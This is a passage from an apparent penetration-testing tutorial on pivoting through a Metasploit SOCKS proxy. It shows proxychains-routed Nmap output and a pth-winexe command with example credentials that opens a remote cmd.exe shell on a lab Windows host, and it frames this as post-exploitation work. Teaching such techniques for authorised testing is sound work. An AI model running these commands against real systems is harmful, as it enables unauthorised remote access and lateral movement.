```
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-09 08:56 EST
|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<> 
<->-OK
|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:80-<> 
<->-OK
|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:139-<> 
<->-OK
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds
root@kali:~#
```

4. Then, use the pth-winexe command to get a shell on the target system:

```
root@kali:~# proxychains pth-winexe -U Windows10/ User%P4ssw0rd //10.0.0.160 cmd.exe
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<> 
<->-OK
E_md4hash wrapper called.
|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<> 
<->-OK
|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<> 
<->-OK
Microsoft Windows [Version 10.0.10586]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
hostname
WINDOWS10

C:\Windows\system32>
```

As you can see, although Metasploit provides us with a huge number of modules and possibilities, we are not restricted to use those modules. Using autoroute and the socks proxy server, we can use other tools and frameworks during the post-exploitation phase.